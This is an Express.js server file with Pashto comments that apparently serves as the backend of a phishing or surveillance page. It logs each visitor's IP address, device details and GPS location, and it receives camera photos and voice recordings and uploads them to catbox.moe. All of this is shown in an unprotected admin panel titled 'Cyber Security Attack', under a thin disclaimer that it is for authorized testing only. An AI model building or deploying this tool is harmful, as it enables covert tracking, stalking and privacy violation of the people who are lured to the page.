const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

// د پراکسی یا کلاوډ هوسټینګ (لکه Render) لپاره د IP د سوابقو سمولو په موخه
app.set('trust proxy', true);

const uploadDir = path.join(__dirname, 'uploads');
const locationsDir = path.join(uploadDir, 'locations');
const deviceInfoDir = path.join(uploadDir, 'device_info');
const linksDir = path.join(uploadDir, 'links');

[uploadDir, locationsDir, deviceInfoDir, linksDir].forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

// د فایلونو ساتلو لپاره د RAM حافظه کارول ترڅو په سرور کې فزیکي ځای ونه نیسي او مستقیم کلاوډ ته لاړ شي
const upload = multer({ storage: multer.memoryStorage() });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use('/uploads', express.static(uploadDir));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Catbox ته د فایل د اپلوډ کولو او انلاین لینک د ترلاسه کولو فنکشن
async function uploadToCatbox(buffer, filename) {
    try {
        const formData = new FormData();
        formData.append('reqtype', 'fileupload');
        formData.append('fileToUpload', buffer, { filename: filename });

        const response = await axios.post('https://catbox.moe/user/api.php', formData, {
            headers: formData.getHeaders(),
            timeout: 20000
        });
        return response.data; // مستقیم انلاین لینک راګرځوي
    } catch (error) {
        console.error('Catbox upload error:', error.message);
        return null;
    }
}

app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
    // د لیدونکي د ریښتیني IP پته معلومول
    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'نامعلوم';
    if (clientIp.includes(',')) {
        clientIp = clientIp.split(',')[0].trim();
    }
    if (clientIp === '::1' || clientIp === '::ffff:127.0.0.1') {
        clientIp = '127.0.0.1 (Localhost)';
    }

    // ۱. د موبایل، برانډ او IP معلوماتو خوندي کول
    if (req.body.device_info) {
        try {
            const info = JSON.parse(req.body.device_info);
            const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
            
            const entry = `📅 نېټه: ${time}\n🌐 د لیدونکي آی‌پي (IP): ${clientIp}\n📱 د وسیلې برانډ: ${info.deviceType}\n🔢 د انډرایډ ورژن: ${info.androidVer}\n📐 د سکرین اندازه: ${info.screenSize}\n🔋 د بیټرۍ چارج: ${info.batteryLevel}\n🌐 د براوزر ژبه: ${info.language}\n-----------------------------------\n`;
            
            fs.appendFileSync(path.join(deviceInfoDir, 'device_info.txt'), entry, 'utf8');
            return res.send("Device Info Saved");
        } catch (e) {}
    }

    // ۲. لوکیشن خوندي کول
    if (req.body.latitude && req.body.longitude) {
        const lat = parseFloat(req.body.latitude);
        const lng = parseFloat(req.body.longitude);
        if (!isNaN(lat) && !isNaN(lng)) {
            const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
            const entry = `نېټه: ${time} | آی‌پي: ${clientIp} | لوکیشن: https://maps.google.com/?q=${lat},${lng}\n-----------------------------------\n`;
            fs.appendFileSync(path.join(locationsDir, 'locations.txt'), entry, 'utf8');
            return res.send("Location Saved");
        }
    }

    // ۳. انځور مستقیم Catbox ته استول او لینک یې په تېکست فایل کې ساتل
    if (req.files && req.files.photo) {
        const file = req.files.photo[0];
        const onlineUrl = await uploadToCatbox(file.buffer, `photo_${Date.now()}.jpg`);
        if (onlineUrl) {
            const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
            const entry = `${onlineUrl}|${time}\n`;
            fs.appendFileSync(path.join(linksDir, 'photos_links.txt'), entry, 'utf8');
            return res.send("Photo Saved");
        } else {
            return res.status(500).send("Photo Upload Failed");
        }
    }

    // ۴. غږیز ریکارډ Catbox ته استول او لینک یې په تېکست فایل کې ساتل
    if (req.files && req.files.voice) {
        const file = req.files.voice[0];
        const onlineUrl = await uploadToCatbox(file.buffer, `voice_${Date.now()}.ogg`);
        if (onlineUrl) {
            const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
            const entry = `${onlineUrl}|${time}\n`;
            fs.appendFileSync(path.join(linksDir, 'voices_links.txt'), entry, 'utf8');
            return res.send("Voice Saved");
        } else {
            return res.status(500).send("Voice Upload Failed");
        }
    }

    res.status(400).send("Bad Request");
});

app.get('/admin', (req, res) => {
    const showWelcome = !req.headers.cookie?.includes('welcome=true') && req.query.action !== 'enter';

    if (req.query.action === 'enter') {
        res.setHeader('Set-Cookie', 'welcome=true; Path=/');
        return res.redirect('/admin');
    }

    if (req.query.delete) {
        const target = req.query.delete;
        if (target === 'locations') {
            const locPath = path.join(locationsDir, 'locations.txt');
            if (fs.existsSync(locPath)) fs.unlinkSync(locPath);
        } else if (target === 'device_info') {
            const devPath = path.join(deviceInfoDir, 'device_info.txt');
            if (fs.existsSync(devPath)) fs.unlinkSync(devPath);
        } else if (target === 'all_photos') {
            const pPath = path.join(linksDir, 'photos_links.txt');
            if (fs.existsSync(pPath)) fs.unlinkSync(pPath);
        } else if (target === 'all_voices') {
            const vPath = path.join(linksDir, 'voices_links.txt');
            if (fs.existsSync(vPath)) fs.unlinkSync(vPath);
        }
        return res.redirect('/admin');
    }

    let deviceInfoHtml = '<p>تاسې تر اوسه د موبایل کوم معلومات نه دي ترلاسه کړي.</p>';
    let deleteDevBtn = '';
    const devPath = path.join(deviceInfoDir, 'device_info.txt');
    if (fs.existsSync(devPath)) {
        deleteDevBtn = `<a href="/admin?delete=device_info" class="delete-btn" onclick="return confirm('ټول معلومات پاک شي؟')">ټول پاکول</a>`;
        const content = fs.readFileSync(devPath, 'utf8');
        deviceInfoHtml = `<pre style="white-space: pre-wrap; font-size: 14px; color: #111; background: #fafafa; padding: 12px; border-radius: 6px; max-height: 250px; overflow-y: auto; font-family: monospace; line-height: 1.5;">${content}</pre>`;
    }

    let locationsHtml = '<p>تر اوسه کوم لوکیشن نه دی ثبت شوی.</p>';
    let deleteLocBtn = '';
    const locPath = path.join(locationsDir, 'locations.txt');
    if (fs.existsSync(locPath)) {
        deleteLocBtn = `<a href="/admin?delete=locations" class="delete-btn" onclick="return confirm('ټول لوکیشنونه پاک شي؟')">ټول پاکول</a>`;
        const content = fs.readFileSync(locPath, 'utf8');
        const matches = [...content.matchAll(/q=([0-9\.-]+),([0-9\.-]+)/g)];
        if (matches.length > 0) {
            locationsHtml = '';
            matches.reverse().forEach(match => {
                locationsHtml += `<div class="map-container"><iframe width="100%" height="150" frameborder="0" scrolling="no" src="https://maps.google.com/maps?q=${match[1]},${match[2]}&z=15&output=embed"></iframe></div>`;
            });
        }
    }

    let photosHtml = "<p style='grid-column: span 3; text-align: center;'>کوم عکس نشته.</p>";
    let deleteAllPhotosBtn = '';
    const pPath = path.join(linksDir, 'photos_links.txt');
    if (fs.existsSync(pPath)) {
        deleteAllPhotosBtn = `<a href="/admin?delete=all_photos" class="delete-btn" onclick="return confirm('ټول عکسونه پاک شي؟')">ټول پاکول</a>`;
        const content = fs.readFileSync(pPath, 'utf8');
        const lines = content.trim().split('\n').filter(Boolean);
        if (lines.length > 0) {
            photosHtml = '';
            lines.reverse().forEach(line => {
                const url = line.split('|')[0];
                photosHtml += `
                    <div class="item-box">
                        <a href="${url}" target='_blank'><img src="${url}" alt='Photo'></a><br>
                    </div>`;
            });
        }
    }

    let voicesHtml = "<p>کوم غږیز ریکارډ تر اوسه نشته.</p>";
    let deleteAllVoicesBtn = '';
    const vPath = path.join(linksDir, 'voices_links.txt');
    if (fs.existsSync(vPath)) {
        deleteAllVoicesBtn = `<a href="/admin?delete=all_voices" class="delete-btn" onclick="return confirm('ټول غږونه پاک شي؟')">ټول پاکول</a>`;
        const content = fs.readFileSync(vPath, 'utf8');
        const lines = content.trim().split('\n').filter(Boolean);
        if (lines.length > 0) {
            voicesHtml = '';
            lines.reverse().forEach(line => {
                const url = line.split('|')[0];
                voicesHtml += `
                    <div class='item-box' style='margin-bottom: 8px; text-align: right; padding: 8px;'>
                        <audio controls src="${url}"></audio>
                    </div>`;
            });
        }
    }

    let html = `
    <!DOCTYPE html>
    <html lang="ps">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>د اډمین پینل - راټول شوي معلومات</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 10px; margin: 0; direction: rtl; text-align: right; }
            .welcome-card { background: white; border-radius: 12px; padding: 20px; max-width: 500px; margin: 30px auto; box-shadow: 0 4px 15px rgba(0,0,0,0.15); text-align: center; }
            .welcome-card img { width: 100%; max-height: 250px; object-fit: cover; border-radius: 8px; margin-bottom: 15px; }
            .welcome-title { color: #111; font-size: 20px; margin-bottom: 10px; border-bottom: 2px solid #25D366; padding-bottom: 8px; }
            .welcome-msg { color: #333; font-size: 14px; line-height: 1.8; text-align: justify; background: #f9f9f9; padding: 12px; border-radius: 6px; border-right: 4px solid #ff4d4d; margin-bottom: 20px; }
            .enter-btn { background-color: #25D366; color: white; padding: 12px 25px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 16px; display: inline-block; }
            h2 { color: #111; border-bottom: 2px solid #25D366; padding-bottom: 6px; margin-top: 15px; font-size: 18px; display: flex; justify-content: space-between; align-items: center; }
            .card { background: white; border-radius: 8px; padding: 10px; margin-bottom: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
            .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
            .item-box { position: relative; border: 1px solid #ddd; border-radius: 4px; overflow: hidden; background: #fff; padding: 4px; text-align: center; }
            .grid img { width: 100%; height: 90px; object-fit: cover; border-radius: 3px; }
            .map-container { margin-bottom: 10px; border-radius: 6px; overflow: hidden; border: 1px solid #ddd; }
            audio { width: 100%; margin-top: 5px; height: 35px; }
            .delete-btn { background-color: #ff4d4d; color: white; border: none; padding: 3px 6px; border-radius: 3px; cursor: pointer; font-size: 11px; text-decoration: none; display: inline-block; margin-top: 4px; }
            p { color: #667781; font-size: 14px; }
        </style>
    </head>
    <body>`;

    if (showWelcome) {
        html += `
        <div class="welcome-card">
            <img src="https://files.catbox.moe/4dzyf1.jpg" alt="Welcome Image">
            <div class="welcome-title">🛡️ Welcome to Cyber Security Attack ⚡</div>
            <p style="text-align: center; font-weight: bold; color: #25D366; margin: 5px 0;">🔰 د برنامې هرکلی!</p>
            <div class="welcome-msg">
                ⚠️ <strong>مهمه خبرتیا:</strong> دا اپلیکیشن یوازې د مجازو امنیتي ازموینو لپاره دی.<br><br>
                👨‍💻 <strong>درنښت، اډمین:</strong> @Mastershahzada
            </div>
            <a href="/admin?action=enter" class="enter-btn">سیستم ته ننوتل 🚀</a>
        </div>`;
    } else {
        html += `
        <h2>📱 د موبایل او سیسټم معلومات: ${deleteDevBtn}</h2>
        <div class="card">${deviceInfoHtml}</div>

        <h2>📍 راټول شوي لوکیشنونه: ${deleteLocBtn}</h2>
        <div class="card">${locationsHtml}</div>

        <h2>📸 اخیستل شوي عکسونه: ${deleteAllPhotosBtn}</h2>
        <div class="card grid">${photosHtml}</div>

        <h2>🎙️ ریکارډ شوي غږونه: ${deleteAllVoicesBtn}</h2>
        <div class="card">${voicesHtml}</div>`;
    }

    html += `</body></html>`;
    res.send(html);
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
